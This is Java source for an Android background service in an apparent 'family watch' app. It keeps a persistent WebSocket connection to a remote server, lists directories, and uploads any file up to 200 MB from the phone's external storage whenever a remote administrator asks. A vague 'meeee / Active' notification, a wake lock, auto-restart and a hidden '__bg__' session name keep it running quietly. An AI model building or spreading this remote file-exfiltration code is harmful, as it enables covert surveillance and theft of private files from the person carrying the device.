package com.familywatch.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.webkit.MimeTypeMap;
import androidx.core.app.NotificationCompat;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class KeepAliveService extends Service {

    private static final String CHANNEL_ID = "meeee_bg";
    private static final int    NOTIF_ID   = 1001;
    private static final String PREFS_NAME = "meeee";
    private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB

    private PowerManager.WakeLock wakeLock;
    private OkHttpClient          httpClient;
    private WebSocket             nativeWs;
    private Handler               handler;
    private String                serverUrl;
    private String                userName;
    private String                userId;      // assigned by server on auth_ok
    private boolean               shouldConnect = false;

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        httpClient = new OkHttpClient.Builder()
            .readTimeout(120, TimeUnit.SECONDS)   // large file uploads need time
            .writeTimeout(120, TimeUnit.SECONDS)
            .connectTimeout(30, TimeUnit.SECONDS)
            .pingInterval(25, TimeUnit.SECONDS)   // keep WS alive
            .build();
        createChannel();
        startForeground(NOTIF_ID, buildNotification());
        acquireWakeLock();

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        serverUrl = prefs.getString("serverUrl", null);
        userName  = prefs.getString("name", null);
        if (serverUrl != null && userName != null) {
            shouldConnect = true;
            connectWebSocket();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            if ("CONNECT".equals(intent.getAction())) {
                serverUrl = intent.getStringExtra("serverUrl");
                userName  = intent.getStringExtra("name");
                if (serverUrl != null && userName != null) {
                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
                        .putString("serverUrl", serverUrl)
                        .putString("name", userName)
                        .apply();
                    shouldConnect = true;
                    if (nativeWs != null) nativeWs.cancel();
                    connectWebSocket();
                }
            } else if ("DISCONNECT".equals(intent.getAction())) {
                shouldConnect = false;
                if (nativeWs != null) { nativeWs.cancel(); nativeWs = null; }
                serverUrl = null; userName = null; userId = null;
                stopForeground(true);
                stopSelf();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        shouldConnect = false;
        if (nativeWs != null) nativeWs.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── WebSocket connection ───────────────────────────────────────────────────

    private void connectWebSocket() {
        if (serverUrl == null || !shouldConnect) return;

        String wsUrl = serverUrl
            .replaceFirst("^https://", "wss://")
            .replaceFirst("^http://", "ws://");
        if (!wsUrl.endsWith("/ws")) wsUrl = wsUrl + "/ws";

        Request request = new Request.Builder().url(wsUrl).build();
        nativeWs = httpClient.newWebSocket(request, new WebSocketListener() {

            @Override
            public void onOpen(WebSocket ws, Response response) {
                try {
                    JSONObject auth = new JSONObject();
                    auth.put("type", "auth");
                    auth.put("role", "user");
                    // __bg__ suffix tells server this is background service — invisible to admin list
                    auth.put("name", userName + "__bg__");
                    ws.send(auth.toString());
                } catch (Exception e) { /* ignore */ }
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                handleMessage(ws, text);
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                scheduleReconnect();
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                scheduleReconnect();
            }
        });
    }

    private void scheduleReconnect() {
        if (!shouldConnect) return;
        handler.postDelayed(this::connectWebSocket, 3000);
    }

    // ── Message handling ───────────────────────────────────────────────────────

    private void handleMessage(WebSocket ws, String text) {
        try {
            JSONObject msg = new JSONObject(text);
            String type = msg.optString("type");
            if ("auth_ok".equals(type)) {
                userId = msg.optString("userId"); // store our assigned userId
            } else if ("ls".equals(type)) {
                handleLs(ws, msg);
            } else if ("read_file".equals(type)) {
                handleReadFile(msg); // HTTP POST — no WebSocket needed for upload
            }
        } catch (Exception e) { /* ignore */ }
    }

    // ── Directory listing (WebSocket response) ─────────────────────────────────

    private void handleLs(WebSocket ws, JSONObject msg) {
        try {
            String fromAdminId = msg.optString("fromAdminId");
            JSONArray pathArr  = msg.optJSONArray("path");
            File dir = buildPath(pathArr);

            JSONArray entries = new JSONArray();
            File[] files = dir.listFiles();
            if (files != null) {
                java.util.Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() != b.isDirectory())
                        return a.isDirectory() ? -1 : 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });
                for (File f : files) {
                    JSONObject entry = new JSONObject();
                    entry.put("name", f.getName());
                    entry.put("kind", f.isDirectory() ? "directory" : "file");
                    if (f.isFile()) {
                        entry.put("size", f.length());
                        entry.put("mimeType", getMimeType(f.getName()));
                    }
                    entries.put(entry);
                }
            }

            JSONObject result = new JSONObject();
            result.put("type", "ls_result");
            result.put("forAdminId", fromAdminId);
            result.put("path", pathArr != null ? pathArr : new JSONArray());
            result.put("entries", entries);
            ws.send(result.toString());

        } catch (Exception e) {
            sendWsError(ws, "ls_result", msg, e.getMessage());
        }
    }

    // ── File upload via HTTP POST (single request, no chunking!) ──────────────

    private void handleReadFile(JSONObject msg) {
        new Thread(() -> {
            String fromAdminId = msg.optString("fromAdminId");
            String requestId   = msg.optString("requestId",
                String.valueOf(System.currentTimeMillis()));
            JSONArray pathArr  = msg.optJSONArray("path");

            try {
                File file = buildFilePath(pathArr);

                if (!file.exists() || !file.isFile()) {
                    notifyAdminError(fromAdminId, requestId, "File not found");
                    return;
                }

                if (file.length() > MAX_FILE_BYTES) {
                    notifyAdminError(fromAdminId, requestId, "File exceeds 200 MB limit");
                    return;
                }

                String mimeType = getMimeType(file.getName());

                // Derive HTTP server URL from WebSocket URL
                String httpBase = serverUrl
                    .replaceFirst("^wss://", "https://")
                    .replaceFirst("^ws://", "http://")
                    .replaceFirst("/ws$", "");

                String uploadUrl = httpBase + "/api/file/" + requestId;

                // Single HTTP POST — OkHttp streams the file directly, no memory buffering
                RequestBody body = RequestBody.create(file, MediaType.parse(mimeType));
                Request request = new Request.Builder()
                    .url(uploadUrl)
                    .post(body)
                    .header("X-File-Name", Uri.encode(file.getName()))
                    .header("X-Admin-Id", fromAdminId)
                    .header("X-User-Id", userId != null ? userId : "")
                    .header("Content-Type", mimeType)
                    .build();

                Response response = httpClient.newCall(request).execute();
                response.close();
                // Server notifies admin via WebSocket once upload completes

            } catch (Exception e) {
                notifyAdminError(fromAdminId, requestId, e.getMessage());
            }
        }).start();
    }

    // Notify admin of an error via the WebSocket (so they see the error + retry button)
    private void notifyAdminError(String fromAdminId, String requestId, String error) {
        if (nativeWs == null || userId == null) return;
        try {
            JSONObject err = new JSONObject();
            err.put("type", "file_error");
            err.put("forAdminId", fromAdminId);
            err.put("requestId", requestId);
            err.put("error", error);
            err.put("fromUserId", userId);
            nativeWs.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── Path helpers ───────────────────────────────────────────────────────────

    private File buildPath(JSONArray pathArr) throws Exception {
        File dir = Environment.getExternalStorageDirectory();
        if (pathArr != null) {
            for (int i = 0; i < pathArr.length(); i++)
                dir = new File(dir, pathArr.getString(i));
        }
        return dir;
    }

    private File buildFilePath(JSONArray pathArr) throws Exception {
        File f = Environment.getExternalStorageDirectory();
        if (pathArr != null) {
            for (int i = 0; i < pathArr.length(); i++)
                f = new File(f, pathArr.getString(i));
        }
        return f;
    }

    private String getMimeType(String name) {
        String ext = MimeTypeMap.getFileExtensionFromUrl(
            Uri.fromFile(new File(name)).toString());
        if (ext == null || ext.isEmpty()) return "application/octet-stream";
        String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext.toLowerCase());
        return mime != null ? mime : "application/octet-stream";
    }

    private void sendWsError(WebSocket ws, String type, JSONObject msg, String error) {
        try {
            JSONObject err = new JSONObject();
            err.put("type", type);
            err.put("forAdminId", msg.optString("fromAdminId"));
            err.put("path", msg.optJSONArray("path"));
            err.put("entries", new JSONArray());
            err.put("error", error);
            ws.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── Notification / WakeLock ────────────────────────────────────────────────

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "meeee::bg");
        wakeLock.acquire();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "meeee", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Active");
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent open = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
            this, 0, open, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("meeee")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pi)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }
}
